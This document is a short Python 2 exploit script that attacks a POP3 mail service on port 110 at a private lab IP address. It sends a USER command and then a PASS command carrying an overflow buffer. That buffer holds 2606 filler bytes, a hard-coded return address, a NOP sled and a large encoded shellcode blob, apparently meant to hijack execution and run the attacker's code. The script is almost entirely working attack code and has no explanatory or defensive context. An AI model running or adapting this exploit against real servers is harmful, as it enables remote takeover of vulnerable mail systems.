#!/usr/bin/python
import socket
ip = "172.16.5.129"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#0x5F4A358F

ret_add = "\x8f\x35\x4a\x5f"

shellcode = ("\xd9\xcb\xba\x43\xf9\xf7\xad\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x31\x55\x17\x03\x55\x17\x83\x86\xfd\x15\x58\xf4\x16\x5b"
"\xa3\x04\xe7\x3c\x2d\xe1\xd6\x7c\x49\x62\x48\x4d\x19\x26\x65"
"\x26\x4f\xd2\xfe\x4a\x58\xd5\xb7\xe1\xbe\xd8\x48\x59\x82\x7b"
"\xcb\xa0\xd7\x5b\xf2\x6a\x2a\x9a\x33\x96\xc7\xce\xec\xdc\x7a"
"\xfe\x99\xa9\x46\x75\xd1\x3c\xcf\x6a\xa2\x3f\xfe\x3d\xb8\x19"
"\x20\xbc\x6d\x12\x69\xa6\x72\x1f\x23\x5d\x40\xeb\xb2\xb7\x98"
"\x14\x18\xf6\x14\xe7\x60\x3f\x92\x18\x17\x49\xe0\xa5\x20\x8e"
"\x9a\x71\xa4\x14\x3c\xf1\x1e\xf0\xbc\xd6\xf9\x73\xb2\x93\x8e"
"\xdb\xd7\x22\x42\x50\xe3\xaf\x65\xb6\x65\xeb\x41\x12\x2d\xaf"
"\xe8\x03\x8b\x1e\x14\x53\x74\xfe\xb0\x18\x99\xeb\xc8\x43\xf6"
"\xd8\xe0\x7b\x06\x77\x72\x08\x34\xd8\x28\x86\x74\x91\xf6\x51"
"\x7a\x88\x4f\xcd\x85\x33\xb0\xc4\x41\x67\xe0\x7e\x63\x08\x6b"
"\x7e\x8c\xdd\x3c\x2e\x22\x8e\xfc\x9e\x82\x7e\x95\xf4\x0c\xa0"
"\x85\xf7\xc6\xc9\x2c\x02\x81\x59\xa0\x09\xd2\xca\xc3\x11\xd5"
"\xb1\x4d\xf7\xbf\xd5\x1b\xa0\x57\x4f\x06\x3a\xc9\x90\x9c\x47"
"\xc9\x1b\x13\xb8\x84\xeb\x5e\xaa\x71\x1c\x15\x90\xd4\x23\x83"
"\xbc\xbb\xb6\x48\x3c\xb5\xaa\xc6\x6b\x92\x1d\x1f\xf9\x0e\x07"
"\x89\x1f\xd3\xd1\xf2\x9b\x08\x22\xfc\x22\xdc\x1e\xda\x34\x18"
"\x9e\x66\x60\xf4\xc9\x30\xde\xb2\xa3\xf2\x88\x6c\x1f\x5d\x5c"
"\xe8\x53\x5e\x1a\xf5\xb9\x28\xc2\x44\x14\x6d\xfd\x69\xf0\x79"
"\x86\x97\x60\x85\x5d\x1c\x80\x64\x77\x69\x29\x31\x12\xd0\x34"
"\xc2\xc9\x17\x41\x41\xfb\xe7\xb6\x59\x8e\xe2\xf3\xdd\x63\x9f"
"\x6c\x88\x83\x0c\x8c\x99")

evil_buff = "A" * 2606 + ret_add +"\x90" * 8 + shellcode 


try:
    print "\nChaos initiated..."
    s.connect((ip, 110))
    data = s.recv(1024)
    s.send('USER hax0r' + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + evil_buff + '\r\n') 
    print "\nMischief Managed"

except:
    print "EPIC FAIL"
